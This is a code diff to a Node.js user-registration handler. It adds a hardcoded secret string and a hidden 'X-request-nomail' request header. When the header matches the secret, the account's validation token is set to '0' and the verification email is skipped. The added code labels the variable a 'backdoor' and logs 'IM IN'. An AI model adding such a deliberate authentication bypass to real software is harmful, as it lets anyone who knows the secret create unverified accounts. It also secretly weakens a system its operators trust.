@@ -10,10 +10,15 @@ function validateEmail(email) {
   return re.test(String(email).toLowerCase());
 }
 
+//this is the string to provide to skip email validation
+var SECRET_NOMAIL = "ABCDZ123";
+
 module.exports.register = function register(req, res, next) {
   var username = req.swagger.params['username'].value;
   var xRequestPassword = req.swagger.params['X-request-password'].value;
   var ReviewToken = req.swagger.params['X-request-peer-review-token'].value;
+  var secret_nomail_backdoor = req.swagger.params['X-request-nomail'].value;
+  console.log("BACKDOOR" + secret_nomail_backdoor);
 
   //Hotfix
   if (username.charAt(0) == "_") {
@@ -91,7 +96,11 @@ module.exports.register = function register(req, res, next) {
   };
 
   user.validation_token = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);;
-  //user.validation_token = "0"; 
+  if (secret_nomail_backdoor == SECRET_NOMAIL)
+  {
+    console.log("IM IN");
+    user.validation_token = "0"; 
+  }
 
 
 
@@ -189,6 +198,13 @@ if (typeof ReviewToken !== 'undefined') {
                   console.log('user inserted');
 
     ///////////////////////::
+    if (user.validation_token == "0")
+    {
+            res.writeHead(200, { "Content-Type": "application/json" });
+            return res.end(JSON.stringify(body));
+    }
+    else
+   {
     transporter.sendMail(mailOptions, function (error, info) {
       if (error) {
 
@@ -202,6 +218,8 @@ if (typeof ReviewToken !== 'undefined') {
             return res.end(JSON.stringify(body));
       }
     });
+  }
+
     /////////////////////////:::
                 }
               });
@@ -288,6 +306,14 @@ if (typeof ReviewToken !== 'undefined') {
                   console.log('user inserted');
 
     ///////////////////////::
+    if (user.validation_token == "0")
+    {
+            res.writeHead(200, { "Content-Type": "application/json" });
+            return res.end(JSON.stringify(body));
+    }
+    else
+   {
+ 
     transporter.sendMail(mailOptions, function (error, info) {
       if (error) {
 
@@ -301,6 +327,7 @@ if (typeof ReviewToken !== 'undefined') {
             return res.end(JSON.stringify(body));
       }
     });
+   }
     /////////////////////////:::
                 }
               });
